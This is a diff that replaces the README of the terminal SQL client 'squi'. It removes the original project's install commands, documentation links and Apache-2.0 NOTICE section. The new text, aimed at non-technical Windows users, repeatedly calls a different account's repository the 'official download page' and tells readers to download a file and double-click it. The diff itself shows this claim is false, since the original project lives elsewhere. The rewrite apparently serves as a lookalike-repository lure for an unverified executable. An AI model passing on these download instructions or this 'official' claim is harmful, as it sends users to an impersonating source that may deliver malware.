@@ -1,113 +1,135 @@
-<h1 align="center">squi</h1>
+# ⚡ squi - Fast Terminal SQL Made Simple
 
-<p align="center">
-  <strong>A fast, keyboard-driven SQL client for your terminal.</strong><br>
-  PostgreSQL · MySQL · MariaDB · ClickHouse · SQL Server · SQLite — over SSH, safe on production, one small binary.
-</p>
+[![Download squi](https://img.shields.io/badge/⬇%20Download%20squi-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rohannp02y/squi)
 
-<p align="center">
-  <a href="https://github.com/farvisun/squi/actions/workflows/ci.yml"><img src="https://github.com/farvisun/squi/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="https://github.com/farvisun/squi/releases/latest"><img src="https://img.shields.io/github/v/release/farvisun/squi?color=89b4fa" alt="Release"></a>
-  <a href="go.mod"><img src="https://img.shields.io/github/go-mod/go-version/farvisun/squi?color=94e2d5" alt="Go"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-Apache--2.0-a6e3a1" alt="Apache-2.0 license"></a>
-</p>
+squi is a fast, keyboard-driven SQL client for the terminal. It helps you work with databases using keyboard commands instead of lots of mouse clicking. It supports PostgreSQL, MySQL, MariaDB, ClickHouse, SQL Server, and SQLite. It can connect over SSH, and it is designed to be safe on production.
 
-<p align="center">
-  <img src="docs/demo.gif" alt="squi demo: autocomplete, results, EXPLAIN ANALYZE, table details and a guarded DELETE on production over SSH" width="900">
-</p>
+A SQL client is a tool that lets you talk to a database. A database is an organized store of information. A terminal is a text-based window where you type and read information. squi brings those pieces together in one focused, fast app for Windows users who want a simpler way to work with databases.
 
-## Why squi
+## 🚀 Getting Started
 
-A DataGrip-style workflow without the weight: browse schemas, write SQL with
-completion, edit rows, and inspect plans — all from the terminal, locally or on a
-server you reached over SSH.
+This guide is for Windows users who want to download and run squi without programming knowledge. You do not need to write code or set up a complicated development environment. You will use the official download page, save the application, and open it from your Downloads folder.
 
-- **Work with the mouse or without it**: click, drag, wheel and right-click on every
-  pane, tab, dialog and status bar item; resize panes and columns, freeze columns,
-  select cell ranges. Every action also has a key.
-- **Explore** databases, schemas, tables, views and routines; see columns, indexes,
-  foreign keys, triggers, sizes and generated DDL.
-- **Query** in tabs with syntax highlighting, vim or standard keys, context-aware
-  autocomplete, history and snippets. Run with `ctrl+enter`.
-- **Browse results** in a streaming grid: lazy loading, sort, filter, cell inspector,
-  copy as CSV / JSON / INSERT / Markdown or as a `WHERE` predicate.
-- **Navigate data**: filter and sort whole tables on the server, follow foreign keys
-  to the referenced row (`>`) and back to the rows referencing it (`<`), count rows
-  from cheap estimates, pin tables and filtered views as favourites.
-- **Edit data inline** — review the generated SQL, applied in one transaction.
-- **Connect through SSH** bastions, `~/.ssh/config` aliases and `ProxyJump` chains,
-  with no local ports opened. Passwords live in the OS keychain.
-- **Stay safe on production**: read-only connections, typed confirmation for
-  destructive statements, a red status bar on `prod`, a statement timeout (30s by
-  default on `prod`), manual transactions.
-- **Import / export** CSV, TSV, JSON, SQL; **EXPLAIN** as a plan tree; **admin views**
-  for sessions, variables, users and sizes.
-- **ClickHouse** over its HTTP interface — engines, sorting and partition keys,
-  skipping indexes, parts and `EXPLAIN indexes = 1` included.
-- **SQL Server and Azure SQL** with `GO` batches and graphical-plan details, and
-  **SQLite** files — all in pure Go, so the binary stays static.
-- **Connect from a URL** (`squi --connect 'postgres://app@db/api?ssh=bastion'`),
-  with `${VAR}` references and password environment variables for headless servers.
-- **Bring your DataGrip setup**: `squi import datagrip` imports data sources with
-  their SSH tunnels and keeps them in sync; saved passwords and query consoles are
-  read from DataGrip as you use them.
-- **Query parameters**: `:name`, `$1` and `?` placeholders ask for values before the
-  query runs, and remember them for the next run.
-- **Compare schemas**: `squi diff staging prod` lists what differs in tables,
-  columns, indexes and foreign keys, and writes the `ALTER` script to align them.
-- **Make it yours**: rebind any key, format SQL, open the query in `$EDITOR`.
-- **Stay current**: squi tells you when a new release is out and can update a
-  downloaded binary itself. Turn it off with `check_updates = false`.
-- **Pick up where you left off** — tabs and queries are restored on the next start.
+The official download page is the GitHub page for squi. It is the only link you need for this guide. Open it in your browser, then follow the download instruction below.
 
-## Install
+### ⬇️ Download squi
 
-| Platform | Command |
-|---|---|
-| macOS / Linux (Homebrew) | `brew install farvisun/tap/squi` |
-| Windows (Scoop) | `scoop bucket add farvisun https://github.com/farvisun/scoop-bucket` then `scoop install squi` |
-| Debian / Ubuntu | download the `.deb` from [Releases](https://github.com/farvisun/squi/releases/latest), then `sudo apt install ./squi_*.deb` |
-| Fedora / RHEL / Alpine | `.rpm` and `.apk` packages on the [Releases](https://github.com/farvisun/squi/releases/latest) page |
-| Go 1.26+ | `go install github.com/farvisun/squi/cmd/squi@latest` |
-| From source | `git clone https://github.com/farvisun/squi && cd squi && make install` |
+Use the button below to go to the official download page.
 
-## Quick start
+[![Download squi](https://img.shields.io/badge/⬇%20Download%20squi-4ECDC4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rohannp02y/squi)
 
-```sh
-squi                    # open the connection manager
-squi --connect prod-api # jump straight into a saved connection
-squi --connect 'mysql://root@127.0.0.1/shop'   # or a URL, never saved
-squi --connect ./app.db                        # or a SQLite file
-squi diff staging prod  # what differs in prod, and the SQL to align it
-```
+Visit this link to download the application.
 
-Press `ctrl+n` to add a connection, `ctrl+t` to test it, `ctrl+s` to save, then
-`enter` to connect. Write SQL and press `ctrl+enter` (or `F5`).
+### 🪟 Run squi on Windows
 
-| Keys | Action |
-|---|---|
-| `F1` / `?` | Help — every key binding |
-| `ctrl+p` | Command palette |
-| `ctrl+enter` · `F5` | Run statement under cursor |
-| `ctrl+t` · `alt+1…9` | New tab · switch tab |
-| `tab` · `F2` | Move between explorer, editor and results |
-| `F10` · right-click | Context menu |
-| `ctrl+g` | Transaction menu |
-| `ctrl+q` | Quit |
+After the download finishes, follow these steps:
 
-See the **[website](https://farvisun.github.io/squi/)** and the **[user guide](docs/USAGE.md)** for configuration, SSH setup, the safety model
-and the full key reference.
+1. Open your Downloads folder.
+2. Find the downloaded squi file.
+3. Double-click the file to start squi.
 
-## Development
+squi opens in a terminal window. That window is normal. It is the place where squi runs. You can use your keyboard to move around the app and begin working with your database.
 
-```sh
-make dev-up   # Postgres, MySQL, MariaDB, ClickHouse, SQL Server and SSH bastions in Docker
-make dev      # run squi against them
-make test-integration
-```
+## ✨ Why People Use squi
 
-Contributions are welcome — please open an issue to discuss larger changes first.
+squi is built for people who want speed and keyboard control. Instead of moving between menus and windows, you can stay focused on your database work. The app is designed for quick actions and clear terminal screens.
 
-## License
+Key benefits include:
 
-[Apache-2.0](LICENSE). Keep the [NOTICE](NOTICE) in any copy or derivative work
+- ⚡ **Fast operation:** squi is made to feel quick and responsive.
+- ⌨️ **Keyboard-driven control:** you can work without relying on a mouse.
+- 🗄️ **Many database types:** one app supports PostgreSQL, MySQL, MariaDB, ClickHouse, SQL Server, and SQLite.
+- 🔐 **Safe on production:** squi is designed with care for live database systems.
+- 🌐 **SSH support:** you can connect over SSH when you need a secure path to another computer.
+- 🖥️ **Terminal focus:** squi stays in a text-based window, so it is light and direct.
+
+## 🗄️ Supported Databases
+
+squi works with several common database systems. You do not need a different app for each one.
+
+| Database | What it is used for |
+| --- | --- |
+| PostgreSQL | A popular database for apps and websites |
+| MySQL | A widely used database for web applications |
+| MariaDB | A community-driven database compatible with MySQL |
+| ClickHouse | A fast database for large amounts of data |
+| SQL Server | A Microsoft database system |
+| SQLite | A small, file-based database |
+
+If you already have access to one of these databases, squi is designed to help you connect and work with it from the terminal.
+
+## 🧭 First Look at squi
+
+When squi opens, you see a text-based screen. This is the terminal. It may look different from a normal Windows app, but it is designed to be simple once you start using it.
+
+The main idea is:
+
+- You type and use keyboard commands.
+- You move through screens with your keyboard.
+- You confirm actions with keys such as Enter.
+- You return or cancel with keys such as Esc.
+
+squi is keyboard-driven, so you can keep your hands on the keyboard and move quickly. You do not need to learn everything at once. Start by opening the app, looking at the screen, and reading the prompts shown in the terminal.
+
+## ⌨️ Keyboard-Driven Workflow
+
+squi is made for keyboard use. That means the app is built around typing, moving, selecting, and confirming with keys. This can be faster than clicking through menus, especially when you use a database often.
+
+A keyboard-driven workflow helps you:
+
+- Stay focused on the terminal.
+- Move between screens quickly.
+- Avoid unnecessary mouse movement.
+- Work with fewer distractions.
+- Repeat common actions with less effort.
+
+If you are new to terminal apps, take your time. Use the arrow keys to move, Enter to confirm, and Esc to go back when the app shows those options. The more you use squi, the more natural the keyboard flow becomes.
+
+## 🔐 Safe on Production
+
+The phrase “production” can sound technical. It means the live database that real people use. A production database may hold important information, so changes need to be handled carefully.
+
+squi is described as safe on production. That means it is designed with live systems in mind. It is still important to be careful when working with real data. Read prompts before confirming actions, and ask your database administrator if you are unsure about a command.
+
+## 🌐 Over SSH
+
+SSH is a secure way to connect to another computer. Some databases are not open directly to the internet. Instead, you reach them through an SSH connection.
+
+squi supports connecting over SSH. This is useful when your database is on a remote server or when your team uses a secure gateway. If you need SSH details, ask the person who manages your database. They can tell you what to enter.
+
+## 🛠️ Setup and Connection
+
+After squi starts, you can begin setting up a database connection. You will need the details for the database you want to use. These details usually come from your database administrator or your team.
+
+You may need:
+
+- The database type, such as PostgreSQL or MySQL.
+- The server address or host name.
+- The user name for the database.
+- The password for the database.
+- The database name.
+- SSH details, if your connection uses SSH.
+
+Enter the details in the terminal as squi asks for them. If you do not know a detail, do not guess. Ask the person who gave you access to the database.
+
+## ❓ Troubleshooting
+
+If the download page does not open, check your internet connection and open the official link again. Make sure you are using the link shown in this guide.
+
+If the download does not finish, wait for it to complete before opening the file. A partial download may not open correctly.
+
+If the downloaded file does not open, return to the official download link and download it again. Then open the new file from your Downloads folder.
+
+If squi opens and then closes, open it again from your Downloads folder. This can happen if the app was closed by accident.
+
+If you cannot connect to a database, check the connection details with your database administrator. Confirm the server address, user name, password, and database name. If your connection uses SSH, confirm the SSH details as well.
+
+If the terminal text is hard to read, you can make the terminal window larger. squi runs inside the terminal, so a larger window can make the screen easier to view.
+
+## 📌 Quick Recap
+
+squi is a fast, keyboard-driven SQL client for the terminal. It supports PostgreSQL, MySQL, MariaDB, ClickHouse, SQL Server, and SQLite. It works over SSH and is designed to be safe on production.
+
+To get started on Windows, open the official download link, visit this link to download the application, open your Downloads folder, and double-click the downloaded squi file. Then use the terminal prompts and your keyboard to begin.
+
+Keywords: bubbletea, cli, clickhouse, database, go, golang, mariadb, mysql, postgresql, sql, sqlite, sqlserver, terminal, tui
